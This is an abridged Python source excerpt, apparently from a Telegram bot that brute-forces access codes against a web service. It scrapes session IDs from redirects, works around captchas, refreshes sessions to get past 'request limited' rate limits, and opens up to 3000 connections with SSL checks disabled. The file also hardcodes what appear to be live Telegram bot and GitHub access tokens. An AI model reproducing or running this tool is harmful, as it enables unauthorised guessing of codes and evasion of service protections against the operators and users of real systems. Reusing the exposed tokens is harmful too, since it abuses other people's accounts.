...
BOT_TOKEN = '8665634936:AAG0ojUNu30kUyeD6Ed_b6UZMOOFaB2uEqg'
GITHUB_TOKEN = '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'
ADMIN_ID = "7289768738"
REPO_OWNER = "Soejyi"
REPO_NAME = "Soe-Jyi-"
##################
...
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    ...
    # --- Session reuse variables ---
    current_session_id = None
    current_mac = None
    session_refresh_time = 0
    SESSION_LIFETIME = 30  # seconds before refresh
    # -----------------------------
    ...
    try:
        while True:
            ...
            now = time.monotonic()
            if current_session_id is None or (now - session_refresh_time) > SESSION_LIFETIME:
                try:
                    async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as temp_session:
                        sid, mac = await get_session_id_with_mac(temp_session, session_url)
                        if sid:
                            current_session_id = sid
                            current_mac = mac
                            session_refresh_time = now
                        else:
                            current_session_id = None
...
async def get_session_id_with_mac(session_obj, session_url, previous_session_id=None):
    ...
    try:
        async with session_obj.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1), mac
            else:
                return previous_session_id, mac
    except:
...
async def perform_check_optimized(session_url, code, chat_id, scan_id=None, recheck=False, message=None,
                                  cached_session_id=None, cached_mac=None):
    """
    Optimized version that reuses a session_id and mac if provided.
    """
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
    ...
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=20)  # reduced from 30
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            ...
            # If no cached session, get a new one
            if session_id is None:
                sid, new_mac = await get_session_id_with_mac(task_session, session_url, None)
                if sid:
                    session_id = sid
                    mac = new_mac
                else:
            ...
            for _ in range(4):  # reduced from 8 to 4
                try:
                    ...
                    print(f"[perform_check_optimized] captcha error: {e}")
            if not auth_code:
                # If captcha fails, maybe session expired, refresh next attempt
                session_id = None
                continue
            ...
            try:
                ...
                print(f"[perform_check_optimized] error: {e}")
                session_id = None
                continue

        if response and 'request limited' in response:
            print(f"[perform_check_optimized] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            session_id = None  # refresh session for next attempt
            continue
        break
...
# Keep the original perform_check for recheck and other uses (can be removed if not needed)
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    # This is kept for compatibility; but we now use perform_check_optimized in run_bruteforce.
    # For recheck, we can also use optimized version.
    return await perform_check_optimized(session_url, code, chat_id, scan_id, recheck, message)
...
async def main():
    ...
    _connector = aiohttp.TCPConnector(
        limit=3000,          # increased from 2000
        ttl_dns_cache=300,
        ssl=False
    )
